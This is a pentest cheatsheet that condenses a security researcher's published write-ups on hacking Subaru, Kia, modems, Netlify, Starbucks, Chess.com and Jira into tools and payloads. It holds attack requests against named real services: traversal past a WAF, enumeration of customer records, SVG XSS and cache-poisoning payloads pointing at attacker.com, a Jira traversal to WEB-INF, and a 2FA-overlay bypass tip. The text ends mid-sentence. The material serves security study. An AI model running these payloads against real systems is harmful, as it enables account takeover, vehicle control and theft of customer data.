# Sam Curry Blog — Pentest Commands & Tools Cheatsheet

A quick-reference pulled from posts on **samcurry.net**. For each post: tools used and copy‑pasteable payloads/commands where available.

> ⚠️ Notes
> - This is a convenience cheatsheet; for full context, see each linked post.
> - HTTP requests below are illustrative and may be truncated/redacted. Replace placeholders before use.

---

## 2025 — Hacking Subaru: Tracking and Controlling Cars via the STARLINK Admin Panel
**Link:** https://samcurry.net/hacking-subaru

**Tools & Techniques**
- Burp Suite (mobile app proxying)
- `nslookup`/DNS enumeration to discover CNAMEs
- `ffuf` for JS/asset directory brute forcing
- Source review of bundled JS

**Handy Commands / Payloads**
```bash
# Resolve customer app CNAME → internal host
nslookup my.subaru.com

# Brute-force JS assets referenced by the login page
ffuf -u https://portal.prod.subarucs.com/assets/_js/FUZZ -w /path/to/wordlists/common.txt -mc all

# Example password reset endpoint (client JS referenced)
POST /forgotPassword/resetPassword.json
Host: portal.prod.subarucs.com
Content-Type: application/json

{"email":"user@subaru.com","password":"Example123!","passwordConfirmation":"Example123!"}
```
> Tip: DevTools/Userscripts to bypass client-side 2FA modals (removing UI overlay) to reach server-side functionality.

---

## 2024 — Hacking Kia: Remotely Controlling Cars With Just a License Plate
**Link:** https://samcurry.net/hacking-kia

**Tools & Techniques**
- Burp Suite to capture site & dealer APIGW traffic
- HTTP request crafting to dealer APIs (VIN lookup, vehicle control)
- Proof-of-concept app to automate plate→VIN→control flow

**Handy Requests**
```http
# owners.kia.com → Unlock request (proxied by server)
POST /<redacted-unlock-endpoint> HTTP/1.1
Host: owners.kia.com
...

# Dealer APIGW VIN search (requires valid token / “dda” role)
POST /apigw/v1/search/vin HTTP/1.1
Host: <dealer-apigw-host>
Authorization: Bearer <dda_access_token>
Content-Type: application/json

{"licensePlate":"ABC123","state":"CA"}
```
> Chain: License plate → dealer API VIN search → vehicle control endpoints.

---

## 2024 — Hacking Millions of Modems (and Investigating Who Hacked My Modem)
**Link:** https://samcurry.net/hacking-millions-of-modems

**Tools & Techniques**
- Local web hosting to serve PoCs
- `curl` to test modem endpoints
- Lightweight reverse proxy/web server & log tailing

**Handy Commands**
```bash
# Serve PoC files locally
python3 -m http.server 8000

# Start nginx (or your local web server)
sudo service nginx start

# Inspect access/error logs live
tail -f /var/log/nginx/access.log

# Probe modem HTTP(S) endpoints
curl -i http://<modem-ip>/igcs/...
```
> Explore admin panels, credential leakage, and remote management endpoints from ISPs/OEMs.

---

## 2023 — Leaked Secrets & Unlimited Miles: Hacking the Largest Airline & Hotel Rewards Platform
**Link:** https://samcurry.net/leaked-secrets-and-unlimited-miles

**Tools & Techniques**
- Burp/HTTP tooling for signed request flows
- Custom Python to reproduce request signing
- Recon (OSINT), GitHub/code search for leaked keys, archival diffs

**Handy Ideas**
- Implement the app’s HMAC/signing routine in Python to forge legitimate-looking API calls.
- Diff mobile vs web traffic to spot privileged endpoints.

---

## 2023 — Web Hackers vs. The Auto Industry
**Link:** https://samcurry.net/web-hackers-vs-the-auto-industry

**Tools & Techniques**
- Mobile app proxying
- Admin/employee portal discovery & JS source review
- Enumeration of VIN/owner data flows and telematics endpoints

**Quick Checks**
- Enumerate public subdomains; hunt for “admin”, “portal”, “dealer”, “telematics”, “starlink” strings.
- Grep bundled JS for hidden API routes and password reset flows.

---

## 2022 — Universal XSS on Netlify’s Next.js Image Pipeline
**Link:** https://samcurry.net/universal-xss-on-netlifys-next-js-library

**Tools & Techniques**
- HTTP request tampering to `/_next/image` and `/_ipx` routes
- Cache poisoning + `x-forwarded-proto` header abuse
- SVG‑based XSS payloads

**Handy Requests / Payloads**
```http
# Open redirect via path parsing
GET /_next/image?url=//example.com/&q=100&w=128&h=128

# SSRF/XSS via unjs/ufo parsing confusion (host whitelist scenario)
GET /_ipx/w_200/https:%2f%2fexample.com%5c@attacker.com%2fattack.svg

# Stored XSS via cache & x-forwarded-proto
GET /_ipx/example.svg
Host: victim.com
X-Forwarded-Proto: http://attacker.com/malicious.svg?
```
> Host an SVG with a JS payload; abuse caching to persist XSS under an attacker‑chosen path.

---

## 2020 — Hacking Chess.com and Accessing 50M Customer Records
**Link:** https://samcurry.net/hacking-chesscom

**Tools & Techniques**
- Mobile app + Burp to capture signed API traffic
- Cookie/session hijack via leaked `PHPSESSID` in API response
- Scope cookie for administrative subdomain

**Handy Steps**
1. Intercept app API calls; note `signed=` parameter scheme.
2. Identify response fields leaking `session_id`.
3. Import cookie into browser; test admin subdomain access.

---

## 2020 — Hacking Starbucks & Accessing ~100M Customer Records
**Link:** https://samcurry.net/hacking-starbucks

**Tools & Techniques**
- Burp Intruder + wordlists to map internal API behind BFF proxy
- Directory traversal with mixed encodings to bypass WAF
- Microsoft Graph OData enumeration via `$count`, `$filter`, `$skip`

**Useful Payloads**
```http
# Traverse behind /bff/proxy using mixed slashes/encodings
GET /bff/proxy/stream/v1/me/streamItems/web\..\.\..\.\..\.\..\.\..\.\..\.\search

# Count total records
GET /bff/proxy/.../Search/v1/Accounts?$count=true

# Filter by prefix
GET /bff/proxy/.../Search/v1/Accounts?$filter=startswith(UserName,'alice')
```
> Use 301/302 hints to map internal routes; then enumerate OData sets at scale.

---

## 2020 — Abusing HTTP Path Normalization & Cache Poisoning (Rocket League)
**Link:** https://samcurry.net/abusing-http-path-normalization

**Tools & Techniques**
- Crafting ambiguous URLs (`//`, `\`, `%2e%2e`, `%5c`) to flip same‑origin checks
- Cache poisoning via normalized vs raw path disparity
- Wireshark/Burp to observe downstream fetches

**Test Inputs**
```
https://victim.tld//attacker.tld/a
https://victim.tld/%2e%2e/..;/
https://victim.tld\@attacker.tld/a
```
> Look for proxy/CDN layers that canonicalize differently from origin applications.

---

## 2019 — CVE-2019-14994 Jira Service Desk Path Traversal → Info Disclosure
**Link:** https://samcurry.net/analysis-of-cve-2019-14994

**Tools & Techniques**
- Crafted traversal strings against Jira Service Desk
- Path probing to enumerate accessible resources

**Payload Sketch**
```
GET /plugins/servlet/desk/site/.../..%2f..%2f..%2fWEB-INF/web.xml
```
> Varies by version & deployment path — adapt traversal depth/prefixes.

---

## 2019 — Filling in the Blanks: Exploiting Null Byte Overflow ($40k)
**Link:** https://samcurry.net/filling-in-the-blanks

**Tools & Techniques**
- Binary auditing & custom PoCs (C)
- Fuzzing boundary conditions with `
